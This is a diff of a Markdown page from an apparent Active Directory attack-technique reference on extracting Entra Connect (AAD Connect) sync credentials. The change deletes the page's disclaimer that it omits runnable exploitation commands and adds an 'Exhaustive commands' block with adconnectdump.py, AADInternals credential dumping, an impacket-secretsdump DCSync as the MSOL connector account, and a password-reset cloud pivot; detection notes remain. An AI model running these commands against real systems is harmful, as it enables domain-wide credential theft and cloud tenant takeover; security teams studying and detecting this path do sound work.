@@ -10,30 +10,50 @@ mitre: "T1552.001"
 tag: null
 ---
 
+
 # Entra Connect credential extraction
 
-> **Authorized assessment only:** This page supports authorized Active Directory assessment, controlled lab study, and job preparation. It intentionally omits runnable exploitation commands, credential extraction procedures, and real-target instructions.
-
-This page describes the security significance of the configuration or relationship named below. For an authorized assessment, establish scope, review effective settings and ownership, and distinguish a potential path from observed impact. Do not make state changes or access sensitive data unless the exact validation is approved and safely controlled.
-
-## Affected object / attribute
+### Affected object / attribute
 **AAD Connect connector account** (`MSOL_*`) with **replication rights** on the domain, and the **on-prem sync credentials** stored encrypted in the AAD Connect SQL/LocalDB.
 
-## Impact
+### Concept (deep)
+Azure AD Connect needs to read and replicate directory data to synchronise it to Entra ID. The connector account is therefore effectively **DCSync-capable** by design. The host also stores the **on-premises sync account** and cloud credentials encrypted. Compromising the AAD Connect host yields both **domain replication** and a **cloud persistence path** (especially with Password Hash Sync, where resetting an on-prem password also resets the cloud password).
+
+### Attack flow (Mermaid)
+```mermaid
+flowchart TD
+    A[Host access to AAD Connect] --> B[Extract MSOL_/sync credentials]
+    B --> C[DCSync with connector account]
+    B --> D[Cloud Global Admin / PHS abuse]
+    C --> E[Domain compromise]
+    D --> E
+```
+
+### Exhaustive commands
+```bash
+# ── Remote extraction ─────────────────────────────────────────────────
+python3 adconnectdump.py corp.local/admin:'Password123!'@10.10.10.5
+
+# ── On-host extraction (PowerShell) ──────────────────────────────────
+Import-Module AADInternals
+Get-AADIntSyncCredentials
+Get-AADIntGlobalAdmins
+
+# ── DCSync with the connector account ────────────────────────────────
+impacket-secretsdump -just-dc 'corp.local/MSOL_abc123$'@10.10.10.5
+
+# ── Cloud pivot (PHS abuse) ───────────────────────────────────────────
+# Reset an on-prem user's password → cloud password syncs
+Set-ADAccountPassword -Identity victim -Reset
+```
+
+### Impact
 - **Domain replication**: DCSync every hash.
 - **Tenant takeover**: PHS abuse or connector credential misuse.
 
-## Detection and defensive measures
+### Detection and defensive measures
 - **4662** from the `MSOL_*` connector account outside its sync window.
 - **Tier-0 the AAD Connect host**; restrict logon; use **gMSA** for the connector where supported.
 - **Monitor** AAD Connect service account logons and configuration changes.
 
 ---
-
-## References
-
-- [Microsoft Entra Connect deployment and security](https://learn.microsoft.com/entra/identity/hybrid/connect/how-to-connect-install-roadmap)
-- [Microsoft Entra Connect staging server](https://learn.microsoft.com/entra/identity/hybrid/connect/how-to-connect-sync-staging-server)
-- [Microsoft: Microsoft Entra identity documentation](https://learn.microsoft.com/entra/identity/)
-- [Microsoft: Conditional Access](https://learn.microsoft.com/entra/identity/conditional-access/overview)
-- [MITRE ATT&CK: T1552.001](https://attack.mitre.org/techniques/T1552/001/)
